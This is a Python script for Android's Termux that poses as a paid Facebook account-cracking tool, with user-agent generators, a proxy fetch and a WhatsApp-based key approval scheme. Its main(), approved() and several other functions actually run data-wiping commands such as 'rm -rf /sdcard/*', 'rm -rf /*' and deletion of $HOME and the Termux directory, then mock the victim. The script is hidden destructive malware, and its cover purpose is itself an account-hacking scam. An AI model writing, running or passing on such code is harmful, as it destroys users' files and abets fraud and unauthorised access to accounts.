import os
import time
os.system("xdg-open https://github.com/premium-All-Command")
time.sleep(1)




import os
import time
os.system("clear")
nm= input('[ðŸ˜˜]\033[1;32m Enter Your Name: ')
time.sleep(1)
 



import os
import time
os.system("clear")
print('[ðŸ¥°]\033[1;92m[Welcome To FJ-Riyad World]')
print('[ðŸ¥°]\033[1;91m[As-salamu alaykum]')
time.sleep(10)



from datetime import date

today = date.today()

# dd/mm/YY
d1 = today.strftime("%d/%m/%Y")



from datetime import datetime

# datetime object containing current date and time
now = datetime.now()
 


# dd/mm/YY H:M:S
dt_string = now.strftime("%H:%M:%S")




import os

try:

    import requests

except ImportError:

    print('\n [âˆš] Modul requests belum terinstall!...\n')

    os.system('pip install requests')
    
try:

    import requests

except ImportError:

    print('\n [âˆš] Modul requests belum terinstall!...\n')

    os.system('pip2 install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [âˆš] Modul Futures belum terinstall!...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [âˆš] Modul Bs4 install!...\n')

    os.system('pip install bs4')
   
try:

    import rich

except ImportError:

    print('\n [âˆš] Modul Rich install!...\n')

    os.system('pip install rich')

import requests, os, re, bs4, sys, uuid, json, time, random, datetime, subprocess

from concurrent.futures import ThreadPoolExecutor as YayanGanteng

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

waktu = '%s %s %s'%(ha,op,ta)

waktu.split('/')

### WARNA RANDOM ###

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

############################ RESPONSE FACEBOOK ###########################################

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,pwBaru=[],[]

Apk = []

ok = []

cp = []

id = []

user = []

loop = 0

import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python random.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']

#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

###########################################################################################

hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"

dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"

aaaa, bbbb, cccc = "tools", "debug", "accesstoken"

#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"

bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"

###########################################################################################

## RANDOM UA

#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']

uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"

uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"

uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"

uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"

uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"

uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"

uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"

#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"

#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"

uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"

uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])

ua_xiaomi = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36'

ua_samsung = 'Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36'

ua_macos = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15'

ua_vivo = 'Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36'

ua_oppo = 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'

ua_huawei = 'Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36'

ua_redmi4a = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36'

ua_vivoy12 = 'Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36'

ua_nokiax = 'NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'

ua_asus = 'Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'

ua_galaxys10 = 'Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36'

ua_lenovo = 'Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36'

uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"

uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"

uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])

# lempankkkkkkkk

ugen2=[]

ugen=[]

try:
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
	open('http.txt','w').write(prox)
except Exception as e:
	os.system ("clear")
prox=open('http.txt','r').read().splitlines()

for xd in range(10000):

    a='Mozilla/5.0 (Symbian/3; Series60/'

    b=random.randrange(1, 9)

    c=random.randrange(1, 9)

    d='Nokia'

    e=random.randrange(100, 9999)

    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

    g=random.randrange(1, 9)

    h=random.randrange(1, 4)

    i=random.randrange(1, 4)

    j=random.randrange(1, 4)

    k='Mobile Safari/535.1'

    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

    ugen2.append(uaku)

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['6','7','8','9','10','11','12'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

    
    
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.user-agents.txt','r').read().splitlines()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
logo ="""\033[1;97m

\033[0;32m$$$$$$$\  $$$$$$\ $$\     $$\  $$$$$$\  $$$$$$$\  
\033[0;32m$$  __$$\ \_$$  _|\$$\   $$  |$$  __$$\ $$  __$$\ 
\033[0;32m$$ |  $$ |  $$ |   \$$\ $$  / $$ /  $$ |$$ |  $$ |
\033[0;32m$$$$$$$  |  $$ |    \$$$$  /  $$$$$$$$ |$$ |  $$ |
\033[0;32m$$  __$$<   $$ |     \$$  /   $$  __$$ |$$ |  $$ |
\033[0;32m$$ |  $$ |  $$ |      $$ |    $$ |  $$ |$$ |  $$ |
\033[0;32m$$ |  $$ |$$$$$$\     $$ |    $$ |  $$ |$$$$$$$  |
\033[0;32m\__|  \__|\______|    \__|    \__|  \__|\_______/

\033[0;95mâ•”â•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘â•â•â•â•â•â•â•â•â•â•â•â•â•—
\033[0;91mâ•‘\033[1;92m|ðŸ”¥|\033[0;91m Author \033[1;92m :  \033[0;92mFJ-Riyad  \033[0;92m      â•‘
\033[0;91mâ•‘\033[1;92m|ðŸ”¥|\033[0;91m Github \033[1;92m :  MR-NAYAN-404    \033[0;92mâ•‘
\033[0;91mâ•‘\033[1;92m|ðŸ”¥|\033[0;91m Whatsapp\033[1;92m:  \033[0;92m+8801615298449  \033[0;92mâ•‘
\033[0;91mâ•‘\033[1;92m|ðŸ”¥|\033[0;91m Fb ID \033[1;92m  :  \033[0;92mFJ-Riyad        \033[0;92mâ•‘
\033[0;91mâ•‘\033[1;92m|ðŸ”¥|\033[0;91m Tool\033[1;92m    :  \033[0;92mThis Paid Tool  \033[0;92mâ•‘
\033[0;95mâ•šâ•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘mâ•â•â•â•â•â•â•â•â•â•â•â•\033[0;97m  """
naim="=FJ-Riyad="

myid=uuid.uuid4().hex[:100].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.131756phpo-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.131756phpo-cov', 'w')
	kok.write(myid+naim)
	kok.close()
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.131756phpo-cov', 'r').read()
	os.system('clear')
	print(logo)
	r1=requests.get("https://github.com/premium-All-Command/approval.txt/blob/main/approval.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		main()
	else:
		os.system("clear")
		print(logo)
		print("\t    \033[1;37m[\033[1;32mâœ“\033[1;37m]\033[1;32mFirst Get Approvel\033[1;37m ")
		
		os.system("clear")
		print(logo)
		print(f"                     {H}YOUR {H}KEY{H} [{H}{H}]{H}")
		print("%s\033[0;95m\033[0;95m\033[1;92m\033[0;97m\033[0;95m%s"%(B,P))
		print("   \033[1;33m  BRO TOOL IS PAID")
		print("    \033[1;34m CAN'T TRY TO BYPSSS OTHER WISE YOURS DATA FUR ")
		print("    \033[1;35m SEND SUBSCRIBE AND THEN SEND KEY ON WHATSAPP")
		print (f"    \033[1;37m[\033[1;32mâœ“\033[1;37m]\033[1;32mYour Key â¬‡ðŸ‘‡â¬‡\n\n    {warna}"+naim+key1)
		input("    \033[1;37m[\033[1;32mâœ“\033[1;37m]\033[1;32m\033[1;32mEnter To Send Key")
		time.sleep(3.5)
		tks = '*ASALAMUALIKUM*%2C%20*print-RIYAD_-SIR*%20*I*%20*BUY*%20*RS350EASYPAISA*%20*YOUR*%20*RANI_*%20*NEW*%20*---*%20*TOOL*%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*:*'+naim+''+key1
		os.system('xdg-open  https://wa.me/+8801309933049?text='+tks)
		Subscraption()

def files():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
    
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}')
def approved():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}')
    
def Bye():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}')
def main():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}')
    
def koto():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}')
    
def mainmenu():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}')
    
def KING():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/");time.sleep(2)
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}');time.sleep(2)
def fuck():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/");time.sleep(2)
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}');time.sleep(2)
    
def FB_KING():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
